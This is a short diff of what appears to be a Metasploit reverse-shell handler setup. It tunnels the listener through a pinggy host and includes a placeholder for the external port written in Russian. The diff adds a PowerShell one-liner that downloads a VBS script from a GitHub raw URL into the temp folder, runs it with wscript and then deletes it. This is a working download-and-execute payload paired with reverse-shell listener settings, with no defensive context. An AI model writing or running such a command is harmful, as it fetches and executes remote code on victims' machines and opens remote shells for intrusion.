@@ -7,3 +7,5 @@ set LHOST drsqv-178-90-252-216.run.pinggy-free.link
 set LPORT ВАШ_ВНЕШНИЙ_ПОРТ
 set ReverseListenerBindAddress 127.0.0.1
 set ReverseListenerBindPort 4444
+
+powershell -c "$p=[IO.Path]::Combine($env:TEMP, 'up.vbs'); iwr 'https://raw.githubusercontent.com/ga/us/refs/heads/main/c/up.vbs' -OutFile $p; Start-Process wscript.exe $p -Wait; rm $p"
